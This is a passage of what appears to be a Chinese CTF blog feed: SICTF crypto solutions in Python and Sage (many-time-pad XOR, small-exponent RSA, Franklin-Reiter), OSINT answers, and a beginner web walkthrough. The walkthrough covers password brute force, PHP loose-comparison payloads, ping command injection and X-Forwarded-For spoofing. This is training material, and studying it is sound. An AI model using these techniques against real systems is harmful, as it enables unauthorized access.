x &lt;= ord('Z')\n\ndef xor_strings(s1, s2):\n    return bytes([b1 ^ b2 for b1, b2 in zip(s1, s2)])\n\ndef infer_space(index, pos):\n    if message[index, pos] != 0:\n        return\n    message[index, pos] = ord(' ')\n    for x in range(len(ciphertexts)):\n        if x != index:\n            message[x][pos] = xor_strings(ciphertexts[x], ciphertexts[index])[pos] ^ ord(' ')\n\ndef find_spaces():\n    for index, x in enumerate(ciphertexts):\n        res = [xor_strings(x, y) for y in ciphertexts if x != y]\n        f = lambda position: len(list(filter(is_character, [s[position] for s in res])))\n        cnt = [f(pos) for pos in range(len(x))]\n        for pos in range(len(x)):\n            space_data.append((f(pos), index, pos))\n\nwith open('222.txt', 'r') as file:\n    ciphertexts = [codecs.decode(x.strip().encode(), 'hex') for x in file.readlines()]\n\nmessage = np.zeros([len(ciphertexts), len(ciphertexts[0])], dtype=int)\n\nspace_data = []\n\nfind_spaces()\n\nspace_data = sorted(space_data, reverse=True)\nfor weight, index, pos in space_data:\n    infer_space(index, pos)\n\nprint('\\n'.join([''.join([chr(c) for c in x]) for x in message]))\n</code></pre>\n<p>得出的结果，猜测第一行数据，异或就可以 Little Red Riding Hood promised Little Red,Rdin+ Hood ppomi4e d to obey de mo8her. Thg gr&amp;n dmother liz ou8 in the&quot;woo#s , a half hcu fr#m the vklla e . When Litxl     Re (Riding&quot;Hoo# entered thi od? a wolf&quot;cam&quot; up to her.,Se d% d not klow 0h nim-l he waq, a) d id #f him.  Goo# day to you   itt e Red Rkdin</p>\n<pre><code class=\"language-Python\">hex_str1 = &quot;1f2037202a1e6d06353b61263d050a0538493b3018544e14171d2b1c4218&quot;\nhex_str2 = &quot;Little Red Riding Hood promised&quot;\n\nbytes1 = bytes.fromhex(hex_str1)\nbytes2 = bytes(hex_str2, 'utf-8')\n\nresult = bytes([a ^ b for a, b in zip(bytes1, bytes2)])\n\nresult_str = result.decode('utf-8')\nprint(result_str)\n</code></pre>\n<h3 id=\"small_e\"><a class=\"markdownIt-Anchor\" href=\"#small_e\">#</a> small_e</h3>\n<p>低指数加密 /m 高位攻击</p>\n<p><img data-src=\"/img/sictfpic/18.png\" alt=\"img\"></p>\n<pre><code class=\"language-Python\">def phase2(high_m, n, c,e):\n    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation='NTL')\n    m = high_m + x\n    M = m((m^e - c).small_roots()[0])\n    hex_str = hex(int(M))[2:]\n    print(hex_str)\n    return hex_str\n\nn = 23407088262641313744603678186127228163189328033499381357614318160776774708961658114505773173784501557046914457908828086210961235530240151825359345210845219656000760996670856300710703016947799649686427460688236465568188205550456293373157997725204643414082796492333552579250010906010553831060540937802882205118399938918764313169385349293602085310111289583058965780887097301702677087443291977479125263301000328313103296364864396361278863921717374909215078711198899810620522933994481419395021233240234478331179727351050575360886334237633420906629984625441302945112631166021776379103081857393866576659121443879590011160797\nc = 1584727211980974717747362694412040878682966138197627512650829607105625096823456063149392973232737929737200028676411430124019573130595696272668927725536797627059576270068695792221537212669276826952363636924278717182163166234322320044764324434683614360641636360301452618063418349310497430566465329766916213742181\nhigh_m = 11658736990073967239197168945911788935424691658202162501032766529463315401599017877851823976178979438592\ne = 3\n\nhex_str = phase2(high_m, n, c,e)\n# 将16进制字符串转换为整数\nint_value = Integer('0x' + hex_str)\n\n# 将整数拆分为多个字节，并转换为对应的ASCII字符\nstr_value = ''.join(chr(int(hex_str[i:i+2], 16)) for i in range(0, len(hex_str), 2))\n\nprint(str_value)\n\n</code></pre>\n<h3 id=\"签到题来咯\"><a class=\"markdownIt-Anchor\" href=\"#签到题来咯\">#</a> 签到题来咯！</h3>\n<pre><code class=\"language-Python\">import libnum\nimport binascii\nfrom  Crypto.Util.number import *\nn = 18993579800590288733556762316465854395650778003397512624355925069287661487515652428099677335464809283955351330659278915073219733930542167360381688856732762552737791137784222098296804826261681852699742456526979985201331982720936091963830799430264680941164508709453794113576607749669278887105809727027129736803614327631979056934906547015919204770702496676692691248702461766117271815398943842909579917102217310779431999448597899109808086655029624478062317317442297276087073653945439820988375066353157221370129064423613949039895822016206336117081475698987326594199181180346821431242733826487765566154350269651592993856883\nc1 = 3089900890429368903963127778258893993015616003863275300568951378177309984878857933740319974151823410060583527905656182419531008417050246901514691111335764182779077027419410717272164998075313101695833565450587029584857433998627248705518025411896438130004108810308599666206694770859843696952378804678690327442746359836105117371144846629293505396610982407985241783168161504309420302314102538231774470927864959064261347913286659384383565379900391857812482728653358741387072374314243068833590379370244368317200796927931678203916569721211768082289529948017340699194622234734381555103898784827642197721866114583358940604520\nc2 = 6062491672599671503583327431533992487890060173533816222838721749216161789662841049274959778509684968479022417053571624473283543736981267659104310293237792925201009775193492423025040929132360886500863823523629213703533794348606076463773478200331006341206053010168741302440409050344170767489936681627020501853981450212305108039373119567034948781143698613084550376070802084805644270376620484786155554275798939105737707005991882264123315436368611647275530607811665999620394422672764116158492214128572456571553281799359243174598812137554860109807481900330449364878168308833006964726761878461761560543284533578701661413931\ndef is_prime(n):\n    if n &lt;= 1:\n        return False\n    if n &lt;= 3:\n        return True\n    if n % 2 == 0 or n % 3 == 0:\n        return False\n    i = 5\n    while i * i &lt;= n:\n        if n % i == 0 or n % (i + 2) == 0:\n            return False\n        i += 6\n    return True    \ndef franklinReiter(n,e,c1,c2):\n    PR.&lt;x&gt; = PolynomialRing(Zmod(n))\n    g1 = (114*x+2333)^int(e) - c1\n    g2 = (514*x+4555)^int(e) - c2\n    def gcd(g1, g2):\n        while g2:\n            g1, g2 = g2, g1 % g2\n        return g1.monic()\n    return -gcd(g1, g2)[0]\n\nfor i in range(1024):\n    if is_prime(i):\n        e = i\n        m=franklinReiter(n,e,c1,c2)\n        print(long_to_bytes((int(m))))\n</code></pre>\n<h1 id=\"forensics\"><a class=\"markdownIt-Anchor\" href=\"#forensics\">#</a> Forensics</h1>\n<h3 id=\"购物之旅\"><a class=\"markdownIt-Anchor\" href=\"#购物之旅\">#</a> 购物之旅</h3>\n<p>SICTF 北京市_顺义区_新顺南大街_北京华联顺义金街购物中心}</p>\n<h3 id=\"美女姐姐\"><a class=\"markdownIt-Anchor\" href=\"#美女姐姐\">#</a> 美女姐姐</h3>\n<p>SICTF 福建省福州市仓山区烟台山公园}</p>\n<h3 id=\"宝塔镇河妖\"><a class=\"markdownIt-Anchor\" href=\"#宝塔镇河妖\">#</a> 宝塔镇河妖</h3>\n<p>SICTF 山东省济宁市汶上县太子灵踪塔}</p>\n",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "http://example.com/2023/08/24/web-new/",
            "url": "http://example.com/2023/08/24/web-new/",
            "title": "web_new",
            "date_published": "2023-08-24T15:55:12.000Z",
            "content_html": "<h1 id=\"web新手\"><a class=\"markdownIt-Anchor\" href=\"#web新手\">#</a> web 新手：</h1>\n<p>攻防世界 WEB 区复现：</p>\n<h2 id=\"robots\"><a class=\"markdownIt-Anchor\" href=\"#robots\">#</a> robots:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824195924438.png\" alt=\"image-20230824195924438\"></p>\n<blockquote>\n<p>robots.txt 文件是一个文本文件，使用任何一个常见的文本编辑器，比如 Windows 系统安装了 Notepad，就可以创建和编辑它</p>\n<p>robots.txt 是一个协议，而不是一个命令。robots.txt 是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt 文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。</p>\n<p>当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在 robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用 robots.txt 文件。如果您希望搜索引擎收录网站上所有内容，请勿建立 robots.txt 文件。</p>\n<p>如果将网站视为酒店里的一个房间，robots.txt 就是主人在房间门口悬挂的 “请勿打扰” 或 “欢迎打扫” 的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但 robots.txt 不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824200258007.png\" alt=\"image-20230824200258007\"></p>\n<blockquote>\n<p>拙见：Disallow 就是禁止的意思</p>\n<p>​\t\t   Allow 就是允许的意思</p>\n</blockquote>\n<p>回归该题：</p>\n<p><img data-src=\"/img/webpic/image-20230824200522350.png\" alt=\"image-20230824200522350\"></p>\n<p>当我们去访问 robots.txt 的时候，发现所有的搜索引擎不允许去访问  f1ag_1s_h3re.php 文件，说明这是敏感信息。根据提示，我们去访问这个文件。</p>\n<p><img data-src=\"/img/webpic/image-20230824201130674.png\" alt=\"image-20230824201130674\"></p>\n<p>成功获取 flag。</p>\n<h2 id=\"backup\"><a class=\"markdownIt-Anchor\" href=\"#backup\">#</a> backup:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824201515063.png\" alt=\"image-20230824201515063\"></p>\n<blockquote>\n<p>提示是去寻找备份文件</p>\n</blockquote>\n<p>打开界面：</p>\n<p><img data-src=\"/img/webpic/image-20230824201448729.png\" alt=\"\"></p>\n<blockquote>\n<p>很容易想到，这里要找 index.php 的备份文件。</p>\n<p>web 网页常见的备份文件后缀名：“.git”,“.svn”,“.swp”,“.~”,“.bak”,“.bash_history”,“.bkf”</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824201722649.png\" alt=\"image-20230824201722649\"></p>\n<p><img data-src=\"/img/webpic/image-20230824201755816.png\" alt=\"image-20230824201755816\"></p>\n<p>获取 flag。</p>\n<h2 id=\"cookie\"><a class=\"markdownIt-Anchor\" href=\"#cookie\">#</a> cookie:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824201926829.png\" alt=\"image-20230824201926829\"></p>\n<p>根据提示，cookie 里面有东西。</p>\n<p><img data-src=\"/img/webpic/image-20230824202025146.png\" alt=\"image-20230824202025146\"></p>\n<blockquote>\n<p>Cookie 是一种存储在计算机浏览器目录中的文本文件。当用户浏览某个站点并注册帐号，就会生成一个 Cookie 文件用于记录登录信息。目前，大多数网站都会应用 Cookie 技术，这既能给用户提供一个好的网络环境，又能方便收集访客信息。</p>\n<h2 id=\"cookie有哪些特性\"><a class=\"markdownIt-Anchor\" href=\"#cookie有哪些特性\">#</a> Cookie 有哪些特性:</h2>\n<p>首先，是 Cookie 的实效性。目前有些 Cookie 是临时的，有些则是持续的。临时的 Cookie 只在浏览器上保存一段规定的时间，一旦超过规定的时间，该 Cookie 就会被系统清除。</p>\n<p>其次，是 Cookie 的限制性。Cookie 必须在 HTML 文件的内容输出之前设置；不同的浏览器 (Netscape Navigator、Internet Explorer) 对 Cookie 的处理不一致，使用时一定要考虑；客户端用户如果设置禁止 Cookie，则 Cookie 不能建立。 并且在客户端，一个浏览器能创建的 Cookie 数量最多为 300 个，并且每个不能超过 4KB，每个 Web 站点能设置的 Cookie 总数不能超过 20 个。</p>\n<h2 id=\"cookie有什么作用\"><a class=\"markdownIt-Anchor\" href=\"#cookie有什么作用\">#</a> Cookie 有什么作用:</h2>\n<p>Cookie 对于网站开发者而言，从某个角度理解更像浏览器的 “缓存” 它清晰的记录你的行为指标，有利于：</p>\n<p>（1）获取精准的访客画像：用户位置、访问喜好、年龄结构、特定账号信息等。</p>\n<p>（2）广告联盟：提供更加精准的相关产品信息，这也是为什么，当你搜索某个产品以后，在各大电商网站或带有广告联盟代码的站点，经常出现同类产品的原因。</p>\n<p>（3）推进更多个性化的内容信息，延迟页面停留时间，提高转化率。</p>\n</blockquote>\n<p>这里我们采用 burp 抓一下包：</p>\n<p><img data-src=\"/img/webpic/image-20230824202352929.png\" alt=\"image-20230824202352929\"></p>\n<p>发现有一个 cookie.php, 尝试一下：</p>\n<p><img data-src=\"/img/webpic/image-20230824202455049.png\" alt=\"image-20230824202455049\"></p>\n<p>当我们传到 url 上的时候，提示我们请看 http response，所以 cookie 应该是在响应包的一个东西。</p>\n<p><img data-src=\"/img/webpic/image-20230824202815382.png\" alt=\"image-20230824202815382\"></p>\n<p>成功获取 flag。</p>\n<h2 id=\"disabled_button\"><a class=\"markdownIt-Anchor\" href=\"#disabled_button\">#</a> disabled_button:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824203157237.png\" alt=\"image-20230824203157237\"></p>\n<p>当我们打开网页：</p>\n<p><img data-src=\"/img/webpic/image-20230824203237567.png\" alt=\"image-20230824203237567\"></p>\n<p>发现此按钮不能按下去。</p>\n<p><img data-src=\"/img/webpic/image-20230824203315948.png\" alt=\"image-20230824203315948\"></p>\n<p>f12 查看源码，发现输入有上面的字段：</p>\n<blockquote>\n<p>当 input 的属性设置为 disabled=“disabled“时，表单不会提交此 input 的数据</p>\n</blockquote>\n<blockquote>\n<p>disabled：对于全部的表单元素都有效，包括 select, radio, checkbox, button 等。若是一个输入项的 disabled 设为 true，则该表单输入项不能获取焦点，用户的全部操做（鼠标点击和键盘输入等）对该输入项都无效，最重要的一点是当提交表单时，这个表单输入项将不会被提交。</p>\n<p>readonly：只针对 input (text /password) 和 textarea 有效；若是设为 true，用户只是不能编辑对应的文本，可是仍然能够聚焦焦点，而且在提交表单的时候，该输入项会做为 form 的一项提交。</p>\n</blockquote>\n<p>所以我们将其删掉就行。</p>\n<p><img data-src=\"/img/webpic/image-20230824203628188.png\" alt=\"image-20230824203628188\"></p>\n<p><img data-src=\"/img/webpic/image-20230824203644118.png\" alt=\"image-20230824203644118\"></p>\n<p>得到 flag</p>\n<h2 id=\"get_post\"><a class=\"markdownIt-Anchor\" href=\"#get_post\">#</a> get_post:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824203743132.png\" alt=\"image-20230824203743132\"></p>\n<p>两种请求方式：</p>\n<p><img data-src=\"/img/webpic/image-20230824204018624.png\" alt=\"image-20230824204018624\"></p>\n<blockquote>\n<p>GET 请求直接在 url 后，进行参数的添加。</p>\n<p>POST 请求需要借助 hackbar。</p>\n</blockquote>\n<p>另外几种请求：</p>\n<p><img data-src=\"/img/webpic/image-20230824204218269.png\" alt=\"image-20230824204218269\"></p>\n<p><img data-src=\"/img/webpic/image-20230824204233311.png\" alt=\"image-20230824204233311\"></p>\n<p><img data-src=\"/img/webpic/image-20230824204248645.png\" alt=\"image-20230824204248645\"></p>\n<p>回归题目：</p>\n<p><img data-src=\"/img/webpic/image-20230824204355681.png\" alt=\"image-20230824204355681\"></p>\n<p>得到 flag</p>\n<h2 id=\"weak_auth\"><a class=\"markdownIt-Anchor\" href=\"#weak_auth\">#</a> weak_auth:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824204503329.png\" alt=\"image-20230824204503329\"></p>\n<p>题目是个弱密码题目：</p>\n<p>可以直接猜简单密码进行登录，也可以用 burp 进行爆破。</p>\n<p><img data-src=\"/img/webpic/image-20230824204634276.png\" alt=\"image-20230824204634276\"></p>\n<p>进入网页后是这样的界面。</p>\n<p><img data-src=\"/img/webpic/image-20230824204721446.png\" alt=\"image-20230824204721446\"></p>\n<p>当我们输入用户名时，提示我们用 admin 去登录。所以这题我们只需要去爆破密码即可。</p>\n<p>当我们请求操作时，拦截下来这样的数据包。</p>\n<p><img data-src=\"/img/webpic/image-20230824204915845.png\" alt=\"image-20230824204915845\"></p>\n<p>这样去构造 payload 去进行爆破密码</p>\n<p><img data-src=\"/img/webpic/image-20230824205021958.png\" alt=\"image-20230824205021958\"></p>\n<p>加载我们的密码字典，开始攻击</p>\n<p><img data-src=\"/img/webpic/image-20230824205112705.png\" alt=\"image-20230824205112705\"></p>\n<p>从长度获知密码应为 123456</p>\n<p><img data-src=\"/img/webpic/image-20230824205327991.png\" alt=\"image-20230824205327991\"></p>\n<p>查看响应包：</p>\n<p><img data-src=\"/img/webpic/image-20230824205351133.png\" alt=\"image-20230824205351133\"></p>\n<p>得到 flag</p>\n<h2 id=\"simple_php\"><a class=\"markdownIt-Anchor\" href=\"#simple_php\">#</a> simple_php:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824205450364.png\" alt=\"image-20230824205450364\"></p>\n<p><img data-src=\"/img/webpic/image-20230824205521655.png\" alt=\"image-20230824205521655\"></p>\n<p>发现是 php 去需要判断的再能获取两个部分的 flag 的。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token operator\">==</span><span class=\"token number\">0</span> <span class=\"token keyword\">and</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>== 弱类型比较。需要了解 php 类型比较的特性。</p>\n<p><strong>PHP 类型比较</strong></p>\n<ul>\n<li>松散比较：使用两个等号 == 比较，只比较值，不比较类型。</li>\n<li>严格比较：用三个等号 === 比较，除了比较值，也比较类型。</li>\n</ul>\n<p>** 方法：**php 中的弱类型比较会使’abc’ == 0 为真，所以输入 a=abc 时，可得到 flag1</p>\n</blockquote>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token operator\">></span><span class=\"token number\">1234</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>is_numeric () 函数会判断如果是数字和数字字符串则返回 TRUE，否则返回 FALSE, 且 php 中弱类型比较时，会使 (‘1234a’ == 1234)</p>\n<p>** 方法：** 输入 b=1235c 即可。</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824210310021.png\" alt=\"image-20230824210310021\"></p>\n<h2 id=\"command_execution\"><a class=\"markdownIt-Anchor\" href=\"#command_execution\">#</a> command_execution:&gt;</h2>\n<blockquote>\n<p>命令执行</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824210429004.png\" alt=\"image-20230824210429004\"></p>\n<blockquote>\n<p><strong>WAF:</strong></p>\n<p>Web 应用程序防火墙（有时也简称为 WAF ）可以通过监视和过滤 Internet 与网站之间的 HTTP 通信来保护网站。</p>\n<p>一个 WAF 可以防止网站受跨站请求伪造的喜欢（被攻击 CSRF），本地文件包含（LFI），SQL 注入，跨站点脚本（XSS），等等。</p>\n<p>输入验证效果不佳的网站可能容易受到代码注入漏洞的攻击，这使攻击者试图让 SQL 语句潜行以访问未经授权的数据库。WAF 可以检测并阻止这些尝试。过时的库和软件也是易受攻击的领域，但 Web 应用程序防火墙可以用作临时解决方案，并阻止这些漏洞，并对其进行修补。</p>\n</blockquote>\n<p>题目：</p>\n<p><img data-src=\"/img/webpic/image-20230824210729558.png\" alt=\"image-20230824210729558\"></p>\n<blockquote>\n<p>ping 用于确定本地主机是否能与另一台主机成功交换 (发送与接收) 数据包，再根据返回的信息，就可以推断 TCP/IP 参数是否设置正确，以及运行是否正常、网络是否通畅等</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824211021366.png\" alt=\"image-20230824211021366\"></p>\n<p>发现有回显，这下来进行拼接，执行命令注入：</p>\n<p><img data-src=\"/img/webpic/image-20230824211133151.png\" alt=\"image-20230824211133151\"></p>\n<p>发现 ls 被执行。</p>\n<p><img data-src=\"/img/webpic/image-20230824211309540.png\" alt=\"image-20230824211309540\"></p>\n<p>找到 flag 位置</p>\n<p><img data-src=\"/img/webpic/image-20230824211410392.png\" alt=\"image-20230824211410392\"></p>\n<p>得到 flag</p>\n<h2 id=\"xff_referer\"><a class=\"markdownIt-Anchor\" href=\"#xff_referer\">#</a> xff_referer:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824211448543.png\" alt=\"image-20230824211448543\"></p>\n<p>记录一下：&gt;</p>\n<blockquote>\n<p>​\t**User-Agent：** 使得服务器能够识别客户使用的操作系统，浏览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中）</p>\n<p>​\t**Cookie：** 网站为了辨别用户身份进行 session 跟踪，并储存在用户本地终端上的数据（通常经过加密）</p>\n<p>​\t <strong>X-Forwarded-For</strong>：简称 XFF 头，代表了 HTTP 的请求端真实的 IP。它被认为是客户端通过 HTTP 代理或者负载均衡器连接到 web 服务端获取源 ip 地址的一个标准（通常一些网站的防注入功能会记录请求端真实 IP 地址并写入数据库或某文件 [通过修改 XXF 头可以实现伪造 IP]）。</p>\n<p>​\t**Referer：** 浏览器向 WEB 服务器表明自己的页面来源。</p>\n<p>​\t**Host：** 客户端指定自己想访问的 WEB 服务器的域名 / IP 地址和端口号。</p>\n</blockquote>\n<blockquote>\n<p><strong>02XFF 注入的概念</strong></p>\n<p>​\tXFF，是 X-Forwarded-for 的缩写，属于 SQL 注入的一种，该注入原理是通过修改 X-Forwarded-for 头对带入系统的 dns 进行 sql 注入，达到欺骗服务器执行恶意的 SQL 命令的效果，从而可以得到网站的数据库内容。</p>\n<p><strong>03XFF 的危害</strong></p>\n<p>​\t①数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。</p>\n<p>​\t②网页篡改：通过操作数据库对特定网页进行篡改。</p>\n<p>​\t③网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</p>\n<p>​\t④数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。</p>\n<p>​\t⑤服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824212024008.png\" alt=\"image-20230824212024008\"></p>\n<p>题目：</p>\n<p><img data-src=\"/img/webpic/image-20230824211956203.png\" alt=\"image-20230824211956203\"></p>\n<p>提示 ip 必须 123.123.123.123，利用 xff 伪造 ip。</p>\n<p>使用 burp</p>\n<p><img data-src=\"/img/webpic/image-20230824215131470.png\" alt=\"image-20230824215131470\"></p>\n<p>进行请求伪造：</p>\n<p><img data-src=\"/img/webpic/image-20230824215155754.png\" alt=\"image-20230824215155754\"></p>\n<p>得到 flag</p>\n<h2 id=\"training-www-robots\"><a class=\"markdownIt-Anchor\" href=\"#training-www-robots\">#</a> Training-WWW-Robots:&gt;</h2>\n<blockquote>\n<p>很明显，这还是一个和 Robots 有关的题目</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824215510884.png\" alt=\"image-20230824215510884\"></p>\n<p><img data-src=\"/img/webpic/image-20230824215659606.png\" alt=\"image-20230824215659606\"></p>\n<p><img data-src=\"/img/webpic/image-20230824215731279.png\" alt=\"image-20230824215731279\"></p>\n<p>得到 flag</p>\n<h2 id=\"simple_js\"><a class=\"markdownIt-Anchor\" href=\"#simple_js\">#</a> simple_js:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824215817083.png\" alt=\"image-20230824215817083\"></p>\n<p><img data-src=\"/img/webpic/image-20230824215915164.png\" alt=\"image-20230824215915164\"></p>\n<p>题目界面</p>\n<p>用 burp 抓一下包。看下响应的情况。</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">dechiffre</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">pass_enc</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>    <span class=\"token comment\">// 传入的密码</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">var</span> pass <span class=\"token operator\">=</span> <span class=\"token string\">\"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\"</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 需要比对的密码  // 这是报错信息  FAUX PASSWORD HAHA</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">var</span> tab  <span class=\"token operator\">=</span> pass_enc<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>           <span class=\"token comment\">// 对传入的密码插入</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                <span class=\"token keyword\">var</span> tab2 <span class=\"token operator\">=</span> pass<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">var</span> i<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">,</span>k<span class=\"token punctuation\">,</span>l<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>m<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>o<span class=\"token punctuation\">,</span>p <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>j <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                        k <span class=\"token operator\">=</span> j <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>n<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                        n <span class=\"token operator\">=</span> tab2<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>o<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span>k <span class=\"token operator\">=</span> j <span class=\"token operator\">=</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>o <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span>l<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>p <span class=\"token operator\">+=</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">fromCharCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>o <span class=\"token operator\">=</span> tab2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">==</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>o<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span>k <span class=\"token operator\">=</span> j <span class=\"token operator\">=</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                        o <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span>l<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">></span> <span class=\"token number\">5</span> <span class=\"token operator\">&amp;&amp;</span> i <span class=\"token operator\">&lt;</span> k<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                                        p <span class=\"token operator\">+=</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">fromCharCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>o <span class=\"token operator\">=</span> tab2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        p <span class=\"token operator\">+=</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">fromCharCode</span><span class=\"token punctuation\">(</span>tab2<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>      <span class=\"token comment\">// 这里只返回了部分字符</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        pass <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span><span class=\"token keyword\">return</span> pass<span class=\"token 